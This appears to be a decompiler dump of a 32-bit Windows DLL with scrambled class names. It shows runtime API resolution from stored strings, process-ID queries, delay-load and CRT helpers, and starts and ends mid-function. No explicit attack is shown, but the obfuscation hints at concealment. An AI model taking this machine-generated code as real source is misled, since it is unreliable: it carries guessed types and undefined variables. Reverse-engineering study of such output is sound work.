  int v21; // [esp+38h] [ebp-20h] BYREF
  void *v22; // [esp+3Ch] [ebp-1Ch]
  int v23; // [esp+40h] [ebp-18h]
  int v24; // [esp+44h] [ebp-14h] BYREF
  int pExceptionObject[3]; // [esp+48h] [ebp-10h] BYREF
  int v26; // [esp+54h] [ebp-4h]

  v23 = 0;
  sub_1000C28D((void *)0x400, (int)v19, 0);
  v26 = 1;
  if ( (*(_DWORD *)(this + 20) & 0x100000) != 0 )
  {
    sub_1002CBB8(pExceptionObject);
    CurrentProcessId = (_ThrowInfo *)&_TI2_AVZdhrnpldcahnGvqzdhRnpldcahn_gfjjefwq_sr__;
    v4 = pExceptionObject;
    goto LABEL_3;
  }
  CurrentProcessId = v3;
  v16 = v3;
  pExceptionObject[0] = (int)&v16;
  sub_10009F32(&v16, (int)&unk_1009577C);
  LOBYTE(v26) = 2;
  v15 = v5;
  v14 = v5;
  v22 = &v14;
  sub_10009F32(&v14, (int)&unk_10095774);
  LOBYTE(v26) = 1;
  v6 = sub_100265E5(v14, v15, (int)v16);
  CurrentProcessId = (_ThrowInfo *)GetCurrentProcessId();
  v7 = GetCurrentProcessId();
  sub_10025D50((int)&v21, *(void **)(this + 4), 1, *(_DWORD *)(this + 8), v7, (DWORD)CurrentProcessId);
  LOBYTE(v26) = 4;
  CurrentProcessId = 0;
  v16 = v20;
  v8 = sub_1000C50A(v19);
  if ( ((int (__stdcall *)(void *, int, int, _ThrowInfo *, _ThrowInfo *))v6)(v22, 2, v8, v16, CurrentProcessId) < 0 )
  {
    CurrentProcessId = 0;
    v16 = v20;
    v9 = sub_1000C50A(v19);
    v10 = ((int (__stdcall *)(void *, int, int, _ThrowInfo *, _ThrowInfo *))v6)(v22, 2, v9, v16, CurrentProcessId);
    sub_1002CAFE(&v24, v10);
    CurrentProcessId = (_ThrowInfo *)&_TI2_AVEtKqstreari_gfjjefwq_sr__;
    v4 = &v24;
LABEL_3:
    _CxxThrowException(v4, CurrentProcessId);
  }
  v11 = (void **)sub_1000C52E(v19);
  v12 = (_DWORD *)sub_1000C28D((void *)*(unsigned __int16 *)v11, (int)v18, v11[1]);
  LOBYTE(v26) = 5;
  sub_10009DF1(v12, a2);
  v23 = 1;
  LOBYTE(v26) = 4;
  sub_1000C45D(v18);
  LOBYTE(v26) = 1;
  sub_1000F1E1(&v21);
  LOBYTE(v26) = 0;
  sub_1000C45D(v19);
  return a2;
}
// 10033AA2: variable 'v3' is possibly undefined
// 10033AB8: variable 'v5' is possibly undefined
// 10033A59: using guessed type int var_34[3];
// 10033A59: using guessed type int var_48[5];

//----- (10033BCD) --------------------------------------------------------
_DWORD *__thiscall sub_10033BCD(int this, _DWORD *a2)
{
  _ThrowInfo *v3; // ecx
  int *v4; // eax
  int v5; // ecx
  DWORD v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  void **v10; // eax
  _DWORD *v11; // eax
  int v13; // [esp-10h] [ebp-6Ch] BYREF
  int v14; // [esp-Ch] [ebp-68h]
  _ThrowInfo *v15; // [esp-8h] [ebp-64h] BYREF
  _ThrowInfo *CurrentProcessId; // [esp-4h] [ebp-60h]
  int v17[5]; // [esp+10h] [ebp-4Ch] BYREF
  int v18[3]; // [esp+24h] [ebp-38h] BYREF
  _ThrowInfo *v19; // [esp+30h] [ebp-2Ch]
  _DWORD v20[2]; // [esp+38h] [ebp-24h] BYREF
  int v21; // [esp+40h] [ebp-1Ch] BYREF
  void *v22; // [esp+44h] [ebp-18h]
  int v23; // [esp+48h] [ebp-14h]
  int pExceptionObject[3]; // [esp+4Ch] [ebp-10h] BYREF
  int v25; // [esp+58h] [ebp-4h]

  v23 = 0;
  sub_1000C28D((void *)0x400, (int)v18, 0);
  v25 = 1;
  if ( (*(_DWORD *)(this + 20) & 0x100000) != 0 )
  {
    sub_1002CBB8(pExceptionObject);
    CurrentProcessId = (_ThrowInfo *)&_TI2_AVZdhrnpldcahnGvqzdhRnpldcahn_gfjjefwq_sr__;
    v4 = pExceptionObject;
    goto LABEL_3;
  }
  CurrentProcessId = v3;
  v15 = v3;
  pExceptionObject[0] = (int)&v15;
  sub_10009F32(&v15, (int)&unk_1009577C);
  LOBYTE(v25) = 2;
  v14 = v5;
  v13 = v5;
  v22 = &v13;
  sub_10009F32(&v13, (int)&unk_10095774);
  LOBYTE(v25) = 1;
  pExceptionObject[0] = (int)sub_100265E5(v13, v14, (int)v15);
  CurrentProcessId = (_ThrowInfo *)GetCurrentProcessId();
  v6 = GetCurrentProcessId();
  sub_10025D50((int)&v21, *(void **)(this + 4), 1, *(_DWORD *)(this + 8), v6, (DWORD)CurrentProcessId);
  LOBYTE(v25) = 4;
  CurrentProcessId = 0;
  v15 = v19;
  v7 = sub_1000C50A(v18);
  if ( ((int (__stdcall *)(void *, int, int, _ThrowInfo *, _ThrowInfo *))pExceptionObject[0])(
         v22,
         1,
         v7,
         v15,
         CurrentProcessId) < 0 )
  {
    CurrentProcessId = 0;
    v15 = v19;
    v8 = sub_1000C50A(v18);
    v9 = ((int (__stdcall *)(void *, int, int, _ThrowInfo *, _ThrowInfo *))pExceptionObject[0])(
           v22,
           1,
           v8,
           v15,
           CurrentProcessId);
    sub_1002CAFE(v20, v9);
    CurrentProcessId = (_ThrowInfo *)&_TI2_AVEtKqstreari_gfjjefwq_sr__;
    v4 = v20;
LABEL_3:
    _CxxThrowException(v4, CurrentProcessId);
  }
  v10 = (void **)sub_1000C52E(v18);
  v11 = (_DWORD *)sub_1000C28D((void *)*(unsigned __int16 *)v10, (int)v17, v10[1]);
  LOBYTE(v25) = 5;
  sub_10009DF1(v11, a2);
  v23 = 1;
  LOBYTE(v25) = 4;
  sub_1000C45D(v17);
  LOBYTE(v25) = 1;
  sub_1000F1E1(&v21);
  LOBYTE(v25) = 0;
  sub_1000C45D(v18);
  return a2;
}
// 10033C15: variable 'v3' is possibly undefined
// 10033C2B: variable 'v5' is possibly undefined
// 10033BCD: using guessed type int var_38[3];
// 10033BCD: using guessed type _DWORD var_24[2];
// 10033BCD: using guessed type int var_4C[5];

//----- (10033D0E) --------------------------------------------------------
char __thiscall sub_10033D0E(_ThrowInfo *this)
{
  int v1; // ecx
  int v2; // eax
  int *v3; // eax
  int v4; // eax
  int v5; // eax
  void **v6; // eax
  _DWORD *v7; // edi
  char v8; // bl
  _DWORD *v9; // esi
  _DWORD *v10; // eax
  char v11; // bl
  int v13; // [esp-10h] [ebp-68h] BYREF
  int v14; // [esp-Ch] [ebp-64h]
  _ThrowInfo *v15; // [esp-8h] [ebp-60h] BYREF
  _ThrowInfo *v16; // [esp-4h] [ebp-5Ch]
  int v17[5]; // [esp+10h] [ebp-48h] BYREF
  int v18[3]; // [esp+24h] [ebp-34h] BYREF
  _ThrowInfo *v19; // [esp+30h] [ebp-28h]
  int pExceptionObject[2]; // [esp+38h] [ebp-20h] BYREF
  void *v21; // [esp+40h] [ebp-18h] BYREF
  void *v22; // [esp+44h] [ebp-14h] BYREF
  bool v23; // [esp+4Bh] [ebp-Dh]
  int v24; // [esp+54h] [ebp-4h]

  if ( (dword_10095794 & 1) == 0 )
  {
    dword_10095794 |= 1u;
    v24 = 0;
    v16 = this;
    v15 = this;
    v21 = &v15;
    sub_10009F32(&v15, (int)&unk_1009577C);
    LOBYTE(v24) = 1;
    v14 = v1;
    v13 = v1;
    pExceptionObject[1] = (int)&v13;
    sub_10009F32(&v13, (int)&unk_10095774);
    LOBYTE(v24) = 0;
    dword_1009240C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_100265E5(v13, v14, (int)v15);
    v24 = -1;
  }
  v22 = 0;
  sub_1000C28D(0, (int)v18, 0);
  v24 = 3;
  v2 = dword_1009240C(0, 3, 0, 0, &v22);
  if ( v2 != -1073741820 )
    goto LABEL_6;
  v3 = (int *)sub_1000C28D(v22, (int)v17, 0);
  LOBYTE(v24) = 4;
  sub_1000C439(v3, (int)v18);
  LOBYTE(v24) = 3;
  sub_1000C45D(v17);
  v16 = (_ThrowInfo *)&v22;
  v15 = v19;
  v4 = sub_1000C50A(v18);
  if ( dword_1009240C(0, 3, v4, v15, v16) < 0 )
  {
    v16 = (_ThrowInfo *)&v22;
    v15 = v19;
    v5 = sub_1000C50A(v18);
    v2 = dword_1009240C(0, 3, v5, v15, v16);
LABEL_6:
    sub_1002CAFE(pExceptionObject, v2);
    v16 = (_ThrowInfo *)&_TI2_AVEtKqstreari_gfjjefwq_sr__;
    v6 = (void **)pExceptionObject;
    goto LABEL_7;
  }
  *(_BYTE *)(v18[1] + 8) = 1;
  v7 = (_DWORD *)sub_1000C52E(v18);
  if ( *v7 > 0xFFu )
  {
    sub_1000DEEF(&v21);
    v16 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
LABEL_10:
    v6 = &v21;
LABEL_7:
    _CxxThrowException(v6, v16);
  }
  v8 = 0;
  v9 = v7 + 1;
  if ( !*v7 )
    goto LABEL_16;
  while ( 1 )
  {
    v10 = sub_10009D2C(pExceptionObject, (wchar_t *)v9[1]);
    LOBYTE(v24) = 5;
    v23 = sub_1000A959((int)&unk_10095628, (int)v10);
    LOBYTE(v24) = 3;
    sub_10009F65(pExceptionObject);
    if ( v23 )
      break;
    v9 = (_DWORD *)((char *)v9 + (-(*((unsigned __int16 *)v9 + 1) + 96) & 3) + *((unsigned __int16 *)v9 + 1) + 96);
    if ( (unsigned int)(unsigned __int8)++v8 >= *v7 )
      goto LABEL_16;
  }
  v11 = v8 + 1;
  if ( !v11 )
  {
LABEL_16:
    sub_10002D88(&v21);
    v16 = (_ThrowInfo *)&_TI2_AVMxpteqpIoxoylsrdYuvyamxpt_sr__;
    goto LABEL_10;
  }
  v24 = -1;
  sub_1000C45D(v18);
  return v11;
}
// 10033D44: variable 'v1' is possibly undefined
// 1009240C: using guessed type int (__stdcall *dword_1009240C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 10095794: using guessed type int dword_10095794;
// 10033D0E: using guessed type void *var_14;
// 10033D0E: using guessed type int var_48[5];

//----- (10033EBD) --------------------------------------------------------
_DWORD *__cdecl sub_10033EBD(_DWORD *a1)
{
  int v1; // edi
  int v2; // ecx
  int v3; // ecx
  int *v4; // eax
  int v5; // eax
  int v6; // eax
  int v8; // [esp-10h] [ebp-64h] BYREF
  int v9; // [esp-Ch] [ebp-60h]
  int v10; // [esp-8h] [ebp-5Ch] BYREF
  int v11; // [esp-4h] [ebp-58h]
  int v12[5]; // [esp+14h] [ebp-40h] BYREF
  int v13[6]; // [esp+28h] [ebp-2Ch] BYREF
  int v14; // [esp+40h] [ebp-14h]
  int pExceptionObject[3]; // [esp+44h] [ebp-10h] BYREF
  int v16; // [esp+50h] [ebp-4h]

  v14 = 0;
  v1 = 1024;
  sub_1000C28D((void *)0x400, (int)v13, 0);
  v16 = 1;
  v11 = v2;
  v10 = v2;
  pExceptionObject[0] = (int)&v10;
  sub_10009F32(&v10, (int)&unk_10095784);
  LOBYTE(v16) = 2;
  v9 = v3;
  v8 = v3;
  v13[5] = (int)&v8;
  sub_10009F32(&v8, (int)&unk_10095774);
  LOBYTE(v16) = 1;
  pExceptionObject[0] = (int)sub_100265E5(v8, v9, v10);
  while ( 1 )
  {
    v11 = 0;
    v10 = v13[3];
    v5 = sub_1000C50A(v13);
    v6 = ((int (__stdcall *)(int, int, int, int))pExceptionObject[0])(16, v5, v10, v11);
    if ( !v6 )
      break;
    if ( v6 != -1073741820 )
    {
      sub_1000DEEF(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
    v1 *= 2;
    v4 = (int *)sub_1000C28D((void *)v1, (int)v12, 0);
    LOBYTE(v16) = 4;
    sub_1000C439(v4, (int)v13);
    LOBYTE(v16) = 1;
    sub_1000C45D(v12);
  }
  sub_10033FD7(v13, a1);
  v14 = 1;
  LOBYTE(v16) = 0;
  sub_1000C45D(v13);
  return a1;
}
// 10033EE6: variable 'v2' is possibly undefined
// 10033EFC: variable 'v3' is possibly undefined
// 10033EBD: using guessed type int var_40[5];

//----- (10033FA7) --------------------------------------------------------
int __stdcall sub_10033FA7(int a1)
{
  sub_1000C28D(0, a1, 0);
  *(_DWORD *)(a1 + 20) = 0;
  *(_DWORD *)(a1 + 24) = 0;
  return a1;
}

//----- (10033FD7) --------------------------------------------------------
_DWORD *__userpurge sub_10033FD7@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  int v2; // eax

  sub_1000C3F3(a1, (int)a2);
  v2 = *(_DWORD *)sub_1000C52E(a2);
  a2[6] = 0;
  a2[5] = v2;
  return a2;
}

//----- (10034019) --------------------------------------------------------
int __userpurge sub_10034019@<eax>(_DWORD *a1@<esi>, int a2)
{
  int v2; // eax
  int v3; // edx
  int v4; // eax
  int result; // eax
  _DWORD pExceptionObject[3]; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v7 = 0;
  if ( a1[5] <= a1[6] )
  {
    sub_1000E15A(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v2 = sub_1000C52E(a1);
  v4 = 16 * v3 + v2;
  result = sub_100339B4(
             a2,
             *(unsigned __int16 *)(v4 + 10),
             *(_DWORD *)(v4 + 4),
             *(_BYTE *)(v4 + 9),
             *(_DWORD *)(v4 + 12),
             *(_DWORD *)(v4 + 16),
             *(_BYTE *)(v4 + 8));
  v7 = 0;
  ++a1[6];
  return result;
}
// 10034053: variable 'v3' is possibly undefined
// 10034019: using guessed type _DWORD pExceptionObject[3];

//----- (1003408D) --------------------------------------------------------
int __stdcall sub_1003408D(int a1, int a2, int a3, int a4, int a5, int a6, int a7, char a8)
{
  *(_DWORD *)a1 = &off_10074E78;
  *(_DWORD *)a1 = &off_10074E54;
  sub_10009F32((_DWORD *)(a1 + 4), (int)&a2);
  sub_10009F32((_DWORD *)(a1 + 12), (int)&a4);
  *(_DWORD *)(a1 + 20) = a6;
  *(_DWORD *)(a1 + 24) = a7;
  *(_BYTE *)(a1 + 28) = a8;
  sub_10009F65(&a2);
  sub_10009F65(&a4);
  return a1;
}
// 10074E54: using guessed type int (__thiscall *off_10074E54)(void *Block, char);
// 10074E78: using guessed type int (__thiscall *off_10074E78)(void *Block, char);

//----- (10034109) --------------------------------------------------------
int *__thiscall sub_10034109(int *Block, char a2)
{
  sub_10034128(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10034128) --------------------------------------------------------
void __thiscall sub_10034128(int *this)
{
  *this = (int)&off_10074E54;
  sub_10009F65(this + 3);
  sub_10009F65(this + 1);
  *this = (int)&off_10074E78;
}
// 10074E54: using guessed type int (__thiscall *off_10074E54)(void *Block, char);
// 10074E78: using guessed type int (__thiscall *off_10074E78)(void *Block, char);

//----- (1003416A) --------------------------------------------------------
_DWORD *__thiscall sub_1003416A(void *this, _DWORD *a2)
{
  sub_10009F32(a2, (int)this + 12);
  return a2;
}

//----- (1003419C) --------------------------------------------------------
_DWORD *__thiscall sub_1003419C(void *this, _DWORD *a2)
{
  sub_10009F32(a2, (int)this + 4);
  return a2;
}

//----- (100341CE) --------------------------------------------------------
int __thiscall sub_100341CE(_DWORD *this)
{
  return this[5];
}

//----- (100341D2) --------------------------------------------------------
int __thiscall sub_100341D2(_DWORD *this)
{
  return this[6];
}

//----- (100341D6) --------------------------------------------------------
char __thiscall sub_100341D6(_BYTE *this)
{
  return this[28];
}

//----- (100341E1) --------------------------------------------------------
_DWORD *__thiscall sub_100341E1(_DWORD *Block, char a2)
{
  *Block = &off_10074E78;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10074E78: using guessed type int (__thiscall *off_10074E78)(void *Block, char);

//----- (10034903) --------------------------------------------------------
int __userpurge sub_10034903@<eax>(_BYTE *a1@<eax>, _BYTE *a2@<ecx>, int a3)
{
  if ( !a3 )
    return 0;
  while ( --a3 && *a1 == *a2 )
  {
    ++a1;
    ++a2;
  }
  return (unsigned __int8)*a1 - (unsigned __int8)*a2;
}

//----- (10034953) --------------------------------------------------------
int __stdcall sub_10034953(_DWORD *a1)
{
  _DWORD *v1; // ecx
  int result; // eax

  v1 = a1;
  for ( result = 0; *v1; ++result )
    ++v1;
  return result;
}

//----- (1003497E) --------------------------------------------------------
int *__thiscall sub_1003497E(int *this)
{
  int *result; // eax
  _DWORD *v2; // edx

  result = &dword_10092898;
  if ( dword_10092898 )
  {
    while ( 1 )
    {
      v2 = (_DWORD *)*result;
      if ( (int *)*result == this )
        break;
      result = (int *)*result;
      if ( !*v2 )
        goto LABEL_4;
    }
  }
  else
  {
LABEL_4:
    if ( (int *)*result != this )
      return result;
  }
  *result = *this;
  return result;
}
// 10092898: using guessed type int dword_10092898;

//----- (10034A61) --------------------------------------------------------
FARPROC __stdcall sub_10034A61(int *a1, int *Arguments)
{
  int *v2; // esi
  int v3; // ebx
  char *v4; // edi
  const CHAR *v5; // ecx
  char *v6; // ebx
  char *v7; // edx
  bool v8; // zf
  HMODULE LibraryA; // edi
  int v11; // edx
  const CHAR *v12; // eax
  FARPROC ProcAddress; // ebx
  _DWORD *v14; // eax
  _DWORD *v15; // eax
  int v16[3]; // [esp+Ch] [ebp-44h] BYREF
  LPCSTR lpLibFileName; // [esp+18h] [ebp-38h]
  BOOL v18; // [esp+1Ch] [ebp-34h]
  LPCSTR lpProcName; // [esp+20h] [ebp-30h]
  HMODULE v20; // [esp+24h] [ebp-2Ch]
  int (__stdcall *v21)(); // [esp+28h] [ebp-28h]
  DWORD LastError; // [esp+2Ch] [ebp-24h]
  volatile LONG *Target; // [esp+38h] [ebp-18h]
  char *v24; // [esp+44h] [ebp-Ch]
  int v25; // [esp+4Ch] [ebp-4h]

  v2 = a1;
  v3 = a1[3];
  v4 = (char *)&_ImageBase + a1[5];
  v5 = (char *)&_ImageBase + a1[1];
  Target = (volatile LONG *)((char *)&_ImageBase + a1[2]);
  v6 = (char *)&_ImageBase + v3;
  v7 = (char *)&_ImageBase + a1[4];
  v25 = a1[7];
  lpLibFileName = v5;
  v24 = v4;
  v16[2] = (int)Arguments;
  v8 = (*a1 & 1) == 0;
  v16[0] = 36;
  v16[1] = (int)a1;
  v18 = 0;
  lpProcName = 0;
  v20 = 0;
  v21 = 0;
  LastError = 0;
  if ( v8 )
  {
    Arguments = v16;
    RaiseException(0xC06D0057, 0, 1u, (const ULONG_PTR *)&Arguments);
    return 0;
  }
  LibraryA = (HMODULE)*Target;
  v11 = *(_DWORD *)&v7[4 * (((char *)Arguments - v6) >> 2)];
  a1 = (int *)(4 * (((char *)Arguments - v6) >> 2));
  v18 = v11 >= 0;
  v12 = (char *)&word_10000002 + v11;
  if ( v11 < 0 )
    v12 = (const CHAR *)(unsigned __int16)v11;
  lpProcName = v12;
  ProcAddress = 0;
  if ( !dword_100928A0 || (ProcAddress = (FARPROC)dword_100928A0(0, v16)) == 0 )
  {
    if ( !LibraryA )
    {
      if ( !dword_100928A0 || (LibraryA = (HMODULE)dword_100928A0(1, v16)) == 0 )
      {
        LibraryA = LoadLibraryA(lpLibFileName);
        if ( !LibraryA )
        {
          LastError = GetLastError();
          if ( !dword_1009289C || (LibraryA = (HMODULE)dword_1009289C(3, v16)) == 0 )
          {
            Arguments = v16;
            RaiseException(0xC06D007E, 0, 1u, (const ULONG_PTR *)&Arguments);
            return v21;
          }
        }
      }
      if ( (HMODULE)InterlockedExchange(Target, (LONG)LibraryA) == LibraryA )
      {
        FreeLibrary(LibraryA);
      }
      else if ( v2[6] )
      {
        v14 = LocalAlloc(0x40u, 8u);
        if ( v14 )
        {
          v14[1] = v2;
          *v14 = dword_10092898;
          dword_10092898 = (int)v14;
        }
      }
    }
    v20 = LibraryA;
    if ( dword_100928A0 )
      ProcAddress = (FARPROC)dword_100928A0(2, v16);
    if ( !ProcAddress )
    {
      if ( !v2[5]
        || !v2[7]
        || (v15 = (_DWORD *)((char *)LibraryA + *((_DWORD *)LibraryA + 15)), *v15 != 17744)
        || v15[2] != v25
        || LibraryA != (HMODULE)v15[13]
        || (ProcAddress = *(FARPROC *)&v24[(_DWORD)a1]) == 0 )
      {
        ProcAddress = GetProcAddress(LibraryA, lpProcName);
        if ( !ProcAddress )
        {
          LastError = GetLastError();
          if ( dword_1009289C )
            ProcAddress = (FARPROC)dword_1009289C(4, v16);
          if ( !ProcAddress )
          {
            a1 = v16;
            RaiseException(0xC06D007F, 0, 1u, (const ULONG_PTR *)&a1);
            ProcAddress = v21;
          }
        }
      }
    }
    *Arguments = (int)ProcAddress;
  }
  if ( dword_100928A0 )
  {
    LastError = 0;
    v20 = LibraryA;
    v21 = ProcAddress;
    dword_100928A0(5, v16);
  }
  return ProcAddress;
}
// 10000000: using guessed type __int16 _ImageBase;
// 10000002: using guessed type __int16 word_10000002;
// 10092898: using guessed type int dword_10092898;
// 1009289C: using guessed type int (__stdcall *dword_1009289C)(_DWORD, _DWORD);
// 100928A0: using guessed type int (__stdcall *dword_100928A0)(_DWORD, _DWORD);

//----- (10034C9E) --------------------------------------------------------
int *__thiscall sub_10034C9E(int *hMem, char a2)
{
  sub_1003497E(hMem);
  if ( (a2 & 1) != 0 )
    LocalFree(hMem);
  return hMem;
}

//----- (10034CBC) --------------------------------------------------------
int __stdcall sub_10034CBC(char *a1)
{
  int *i; // esi
  _BYTE *v2; // ecx
  int v3; // edi
  int v4; // eax
  int *v5; // edi
  int *v6; // ebx
  int v8; // [esp+0h] [ebp-4h]

  v8 = -2147024770;
  if ( *(_DWORD *)&byte_10000040[(_DWORD)off_1000003C + 164] )
  {
    for ( i = (int *)((char *)&_ImageBase + *(_DWORD *)&byte_10000040[(_DWORD)off_1000003C + 160]); ; i += 8 )
    {
      v4 = i[1];
      if ( !v4 )
        break;
      v2 = (char *)&_ImageBase + v4;
      v3 = strlen((const char *)&_ImageBase + v4);
      if ( v3 == strlen(a1) && !sub_10034903(a1, v2, v3) )
        break;
    }
    if ( i[1] )
    {
      v5 = (int *)((char *)&_ImageBase + i[3]);
      v6 = &v5[sub_10034953(v5)];
      while ( v5 < v6 )
        sub_10034A61(i, v5++);
      return 0;
    }
  }
  return v8;
}
// 10000000: using guessed type __int16 _ImageBase;
// 1000003C: using guessed type int *off_1000003C;

//----- (10034D58) --------------------------------------------------------
int __stdcall sub_10034D58(char *hLibModule)
{
  int *v1; // esi
  char *v2; // ecx
  int v3; // eax
  _DWORD *v4; // eax
  HMODULE *v5; // esi
  _DWORD *v6; // ebx
  int v7; // eax
  char *v8; // ecx
  _BYTE *v9; // edi
  int v11; // [esp+4h] [ebp-8h]
  int *hMem; // [esp+8h] [ebp-4h]
  HMODULE hLibModulea; // [esp+14h] [ebp+8h]

  v11 = 0;
  v1 = (int *)dword_10092898;
  hMem = (int *)dword_10092898;
  if ( dword_10092898 )
  {
    do
    {
      v2 = (char *)&_ImageBase + *(_DWORD *)(v1[1] + 4);
      v3 = strlen(v2);
      if ( v3 == strlen(hLibModule) && !sub_10034903(hLibModule, v2, v3) )
        break;
      v1 = (int *)*v1;
      hMem = v1;
    }
    while ( v1 );
    if ( v1 )
    {
      v4 = (_DWORD *)v1[1];
      if ( v4[6] )
      {
        v5 = (HMODULE *)((char *)&_ImageBase + v4[2]);
        v6 = (_DWORD *)((char *)&_ImageBase + v4[3]);
        hLibModulea = *v5;
        v7 = 4 * sub_10034953(v6);
        v8 = (char *)&_ImageBase + *(_DWORD *)(hMem[1] + 24);
        v9 = v6;
        while ( v7 )
        {
          --v7;
          *v9++ = *v8++;
        }
        FreeLibrary(hLibModulea);
        *v5 = 0;
        sub_10034C9E(hMem, 1);
        return 1;
      }
    }
  }
  return v11;
}
// 10000000: using guessed type __int16 _ImageBase;
// 10092898: using guessed type int dword_10092898;

//----- (10034E35) --------------------------------------------------------
void __thiscall sub_10034E35(void *this)
{
  *(_DWORD *)this = &ikc::izq_ezibc::`vftable';
  sub_1003A301(this);
}
// 10070320: using guessed type void *ikc::izq_ezibc::`vftable';

//----- (10034E40) --------------------------------------------------------
_DWORD *__thiscall sub_10034E40(_DWORD *Block, char a2)
{
  *Block = &ikc::izq_ezibc::`vftable';
  sub_1003A301(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10070320: using guessed type void *ikc::izq_ezibc::`vftable';

//----- (10034E62) --------------------------------------------------------
std::exception *__thiscall sub_10034E62(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &ikc::izq_ezibc::`vftable';
  return this;
}
// 10070320: using guessed type void *ikc::izq_ezibc::`vftable';

//----- (10035029) --------------------------------------------------------
void __thiscall sub_10035029(struct type_info *this)
{
  *(_DWORD *)this = &nxys_uwip::`vftable';
  type_info::_Type_info_dtor(this);
}
// 1007032C: using guessed type void *nxys_uwip::`vftable';

//----- (10035037) --------------------------------------------------------
struct type_info *__thiscall sub_10035037(struct type_info *Block, char a2)
{
  sub_10035029(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100350C0) --------------------------------------------------------
char *__thiscall sub_100350C0(char *this)
{
  return this + 8;
}

//----- (10035A4A) --------------------------------------------------------
void __thiscall sub_10035A4A(void *this)
{
  if ( this != (void *)dword_1008D3D8 )
    __report_gsfailure();
}
// 1008D3D8: using guessed type int dword_1008D3D8;

//----- (1003696F) --------------------------------------------------------
errno_t __cdecl sub_1003696F(wchar_t *String, size_t Size)
{
  return _wcsupr_s_l(String, Size, 0);
}

//----- (10039D3B) --------------------------------------------------------
int __cdecl sub_10039D3B(int a1)
{
  int result; // eax

  result = a1;
  dword_100928C8 = a1;
  return result;
}
// 100928C8: using guessed type int dword_100928C8;

//----- (1003A1CE) --------------------------------------------------------
wint_t __cdecl sub_1003A1CE(wint_t C)
{
  return _towupper_l(C, 0);
}

//----- (1003A301) --------------------------------------------------------
void __thiscall sub_1003A301(void *this)
{
  bool v1; // zf

  v1 = *((_DWORD *)this + 2) == 0;
  *(_DWORD *)this = &ikc::qlurhxmnb::`vftable';
  if ( !v1 )
    free(*((void **)this + 1));
}
// 1007034C: using guessed type void *ikc::qlurhxmnb::`vftable';

//----- (1003A360) --------------------------------------------------------
std::exception *__thiscall sub_1003A360(std::exception *this, char *a2)
{
  std::exception::exception(this, (const char *const *)&a2);
  *(_DWORD *)this = &ikc::zji_ljuxnx::`vftable';
  return this;
}
// 10070378: using guessed type void *ikc::zji_ljuxnx::`vftable';

//----- (1003A379) --------------------------------------------------------
std::exception *__thiscall sub_1003A379(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &ikc::zji_ljuxnx::`vftable';
  return this;
}
// 10070378: using guessed type void *ikc::zji_ljuxnx::`vftable';

//----- (1003A3D7) --------------------------------------------------------
void *__thiscall sub_1003A3D7(void *Block, char a2)
{
  sub_1003A301(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003A3F3) --------------------------------------------------------
_DWORD *__thiscall sub_1003A3F3(_DWORD *Block, char a2)
{
  *Block = &ikc::sjn_wxme::`vftable';
  sub_1003A301(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1007036C: using guessed type void *ikc::sjn_wxme::`vftable';

//----- (1003A415) --------------------------------------------------------
_DWORD *__thiscall sub_1003A415(_DWORD *Block, char a2)
{
  *Block = &ikc::zji_ljuxnx::`vftable';
  sub_1003A301(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10070378: using guessed type void *ikc::zji_ljuxnx::`vftable';

//----- (1003A437) --------------------------------------------------------
_DWORD *__thiscall sub_1003A437(_DWORD *Block, char a2)
{
  *Block = &ikc::zji_ljuxnx::`vftable';
  sub_1003A301(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10070378: using guessed type void *ikc::zji_ljuxnx::`vftable';

//----- (1003A799) --------------------------------------------------------
int sub_1003A799()
{
  return dword_1008D0C4;
}
// 1008D0C4: using guessed type int dword_1008D0C4;

//----- (1003AF4B) --------------------------------------------------------
int __cdecl sub_1003AF4B(_DWORD *a1)
{
  if ( a1 && dword_100928E4 )
  {
    *a1 = dword_100928E4;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 1003CA7A: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 100928E4: using guessed type int dword_100928E4;

//----- (1003AFFA) --------------------------------------------------------
int __cdecl sub_1003AFFA(_DWORD *a1)
{
  if ( a1 && dword_100928E4 )
  {
    *a1 = dword_100928F0;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 1003CA7A: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 100928E4: using guessed type int dword_100928E4;
// 100928F0: using guessed type int dword_100928F0;

//----- (1003BD5C) --------------------------------------------------------
int __cdecl sub_1003BD5C(int a1)
{
  int result; // eax

  result = a1;
  dword_10092C4C = a1;
  return result;
}
// 10092C4C: using guessed type int dword_10092C4C;

//----- (1003C57F) --------------------------------------------------------
void *sub_1003C57F()
{
  return &unk_100752FC;
}

//----- (1003C5A3) --------------------------------------------------------
void __cdecl sub_1003C5A3()
{
  ;
}

//----- (1003C8A2) --------------------------------------------------------
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
  return 1;
}

//----- (1003C93C) --------------------------------------------------------
int __cdecl sub_1003C93C(int a1)
{
  int result; // eax

